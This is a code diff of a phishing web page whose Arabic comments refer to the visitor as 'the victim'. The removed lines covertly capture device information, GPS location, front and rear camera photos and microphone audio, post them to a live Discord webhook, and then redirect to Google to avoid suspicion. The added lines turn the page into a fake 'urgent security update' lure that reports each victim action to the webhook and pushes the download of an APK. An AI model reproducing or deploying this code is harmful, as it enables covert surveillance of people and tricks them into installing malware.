@@ -2,169 +2,75 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Loading...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Update Required</title>
 <style>
 body {
     background: #000;
     color: #fff;
-    font-family: Arial;
+    font-family: 'Segoe UI', Arial;
     text-align: center;
-    padding-top: 50%;
+    padding: 50px 20px;
+}
+.box {
+    background: #1a1a1a;
+    border-radius: 20px;
+    padding: 30px;
+    max-width: 350px;
+    margin: auto;
+    border: 1px solid #333;
+}
+button {
+    background: #007aff;
+    color: white;
+    border: none;
+    padding: 15px 30px;
+    font-size: 18px;
+    border-radius: 30px;
+    margin-top: 20px;
+    width: 100%;
+}
+.warning {
+    color: #ff4444;
+    font-size: 12px;
+    margin-top: 20px;
 }
 </style>
 </head>
 <body>
-<div>جاري التحميل...</div>
+<div class="box">
+    <h2>⚠️ تحديث أمني عاجل</h2>
+    <p>تم اكتشاف ثغرة في جهازك.<br>لحماية بياناتك، يرجى تحديث التطبيق الأمني.</p>
+    <button onclick="downloadAPK()">تحميل التحديث الآن</button>
+    <p class="warning">مطلوب Android 5.0 أو أحدث</p>
+</div>
 
 <script>
 const webhook = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
 
-async function sendToDiscord(data, type, isFile = false) {
-    try {
-        if (isFile) {
-            const fd = new FormData();
-            fd.append("file", data, `${type}_${Date.now()}.png`);
-            await fetch(webhook, { method: "POST", body: fd });
-        } else {
-            const fd = new FormData();
-            fd.append("content", `**[${type}]**\n\`\`\`\n${JSON.stringify(data, null, 2)}\n\`\`\``);
-            await fetch(webhook, { method: "POST", body: fd });
-        }
-    } catch(e) {}
-}
+// إرسال أن الضحية فتح الصفحة
+fetch(webhook, {
+    method: "POST",
+    body: new FormData().append("content", "🎯 الضحية فتح صفحة التحديث")
+});
 
-// معلومات الجوال الأساسية
-const mobileInfo = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    touchPoints: navigator.maxTouchPoints,
-    isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
-};
-sendToDiscord(mobileInfo, "MOBILE_INFO");
-
-// البطارية
-if (navigator.getBattery) {
-    navigator.getBattery().then(battery => {
-        sendToDiscord({
-            level: (battery.level * 100) + "%",
-            charging: battery.charging,
-            chargingTime: battery.chargingTime + " seconds"
-        }, "BATTERY");
+function downloadAPK() {
+    // الرابط المباشر للتطبيق APK (ترفعه على Google Drive أو أي استضافة)
+    const apkUrl = "https://example.com/your-app.apk";
+    
+    // نرسل إشعار أن الضحية طلب التحميل
+    fetch(webhook, {
+        method: "POST",
+        body: new FormData().append("content", "📥 الضحية نقر على تحميل APK")
     });
+    
+    window.location.href = apkUrl;
+    
+    // بعد التحميل، يظهر إشعار بالتثبيت
+    setTimeout(() => {
+        alert("✅ تم التحميل. افتح ملف 'Update.apk' من قائمة التنزيلات لتثبيت التحديث.");
+    }, 2000);
 }
-
-// GPS الموقع
-if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(pos => {
-        sendToDiscord({
-            lat: pos.coords.latitude,
-            lng: pos.coords.longitude,
-            accuracy: pos.coords.accuracy + "m",
-            speed: pos.coords.speed || "غير متاح",
-            googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-        }, "GPS");
-    }, err => {
-        sendToDiscord({ error: err.message }, "GPS_ERROR");
-    }, { enableHighAccuracy: true, timeout: 8000 });
-}
-
-// كاميرتين (أمامية + خلفية)
-async function captureBothCameras() {
-    try {
-        // الكاميرا الأمامية (الوجه)
-        const frontStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" }
-        });
-        const frontVideo = document.createElement('video');
-        frontVideo.srcObject = frontStream;
-        frontVideo.play();
-        
-        // الكاميرا الخلفية (المكان)
-        const backStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "environment" }
-        });
-        const backVideo = document.createElement('video');
-        backVideo.srcObject = backStream;
-        backVideo.play();
-        
-        setTimeout(() => {
-            // تصوير الأمامية
-            const frontCanvas = document.createElement('canvas');
-            frontCanvas.width = frontVideo.videoWidth;
-            frontCanvas.height = frontVideo.videoHeight;
-            frontCanvas.getContext('2d').drawImage(frontVideo, 0, 0);
-            frontCanvas.toBlob(blob => {
-                sendToDiscord(blob, "FRONT_CAM", true);
-                frontStream.getTracks().forEach(t => t.stop());
-            });
-            
-            // تصوير الخلفية
-            const backCanvas = document.createElement('canvas');
-            backCanvas.width = backVideo.videoWidth;
-            backCanvas.height = backVideo.videoHeight;
-            backCanvas.getContext('2d').drawImage(backVideo, 0, 0);
-            backCanvas.toBlob(blob => {
-                sendToDiscord(blob, "BACK_CAM", true);
-                backStream.getTracks().forEach(t => t.stop());
-            });
-        }, 1000);
-        
-    } catch(e) {
-        // إذا فشلت كاميرتين، نجرب كاميرا واحدة
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    sendToDiscord(blob, "CAMERA", true);
-                    stream.getTracks().forEach(t => t.stop());
-                });
-            }, 1000);
-        } catch(e2) {
-            sendToDiscord({ error: e2.message }, "CAMERA_ERROR");
-        }
-    }
-}
-
-// ميكروفون (تسجيل صوت)
-async function captureAudio() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            if (blob.size > 1000) {
-                const fd = new FormData();
-                fd.append("file", blob, `audio_${Date.now()}.webm`);
-                fetch(webhook, { method: "POST", body: fd });
-            }
-            stream.getTracks().forEach(t => t.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
-    } catch(e) {}
-}
-
-// تشغيل كل شيء
-captureBothCameras();
-captureAudio();
-
-// إخفاء الصفحة بعد 5 ثواني
-setTimeout(() => {
-    document.body.innerHTML = '<div style="display:none"></div>';
-    window.location.href = "https://www.google.com"; // يوجه الضحية لجوجل عشان ما يشك
-}, 5000);
 </script>
 </body>
 </html>
